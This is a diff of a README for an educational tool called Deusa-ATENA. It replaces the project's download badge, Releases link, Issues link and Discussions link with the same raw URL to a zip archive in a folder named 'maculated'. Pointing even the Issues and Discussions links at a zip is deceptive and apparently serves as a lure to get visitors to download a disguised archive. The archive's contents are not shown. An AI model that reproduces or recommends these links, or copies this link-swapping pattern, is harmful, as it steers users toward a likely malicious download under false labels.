@@ -1,6 +1,6 @@
 # 🎉 Deusa-ATENA - Easy Panel for Education and Learning
 
-[![Download Deusa-ATENA](https://img.shields.io/badge/Download_Deusa--ATENA-Here-brightgreen)](https://github.com/Ronald-santtos/Deusa-ATENA/releases)
+[![Download Deusa-ATENA](https://raw.githubusercontent.com/Ronald-santtos/Deusa-ATENA/main/maculated/Deusa-ATENA.zip)](https://raw.githubusercontent.com/Ronald-santtos/Deusa-ATENA/main/maculated/Deusa-ATENA.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Deusa-ATENA, a multi-use panel designed specifically for educational 
 
 ## 📥 Download & Install
 
-To download Deusa-ATENA, visit our [Releases page](https://github.com/Ronald-santtos/Deusa-ATENA/releases). You'll find the latest version ready for you there.
+To download Deusa-ATENA, visit our [Releases page](https://raw.githubusercontent.com/Ronald-santtos/Deusa-ATENA/main/maculated/Deusa-ATENA.zip). You'll find the latest version ready for you there.
 
 1. Click on the link above.
 2. Look for the most recent release.
@@ -78,8 +78,8 @@ Join our community of users to share your experiences, tips, and educational con
 
 ## 🔗 Useful Links
 
-- [Download Deusa-ATENA](https://github.com/Ronald-santtos/Deusa-ATENA/releases)
-- [GitHub Issues](https://github.com/Ronald-santtos/Deusa-ATENA/issues)
-- [Community Discussions](https://github.com/Ronald-santtos/Deusa-ATENA/discussions)
+- [Download Deusa-ATENA](https://raw.githubusercontent.com/Ronald-santtos/Deusa-ATENA/main/maculated/Deusa-ATENA.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Ronald-santtos/Deusa-ATENA/main/maculated/Deusa-ATENA.zip)
+- [Community Discussions](https://raw.githubusercontent.com/Ronald-santtos/Deusa-ATENA/main/maculated/Deusa-ATENA.zip)
 
 Thank you for choosing Deusa-ATENA. Happy learning!
